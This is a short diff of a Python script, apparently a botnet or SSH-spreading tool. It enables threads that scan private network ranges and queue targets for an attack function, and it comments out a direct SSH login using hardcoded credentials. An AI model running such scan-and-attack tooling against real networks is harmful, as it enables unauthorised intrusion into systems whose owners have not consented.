@@ -119,12 +119,12 @@ def attack(q):
 
 
 if __name__ == '__main__':
-    # b = BotNet.BotNet(networks=["10.1.0.0/24", "10.2.0.0/24", "11.0.0.0/24"])
-    # network = ["10.1.0.0/24", "10.2.0.0/24", "11.0.0.0/24"]
-    #
-    # q = Queue()
-    # t1 = Thread(target=scan, args=(q, network))
-    # t2 = Thread(target=attack, args=(q,))
-    # t1.start()
-    # t2.start()
-    sshLogin("user", "10.1.0.114", "abcd")
+    b = BotNet.BotNet(networks=["10.1.0.0/24", "10.2.0.0/24", "11.0.0.0/24"])
+    network = ["10.1.0.0/24", "10.2.0.0/24", "11.0.0.0/24"]
+
+    q = Queue()
+    t1 = Thread(target=scan, args=(q, network))
+    t2 = Thread(target=attack, args=(q,))
+    t1.start()
+    t2.start()
+    # sshLogin("user", "10.1.0.114", "abcd")
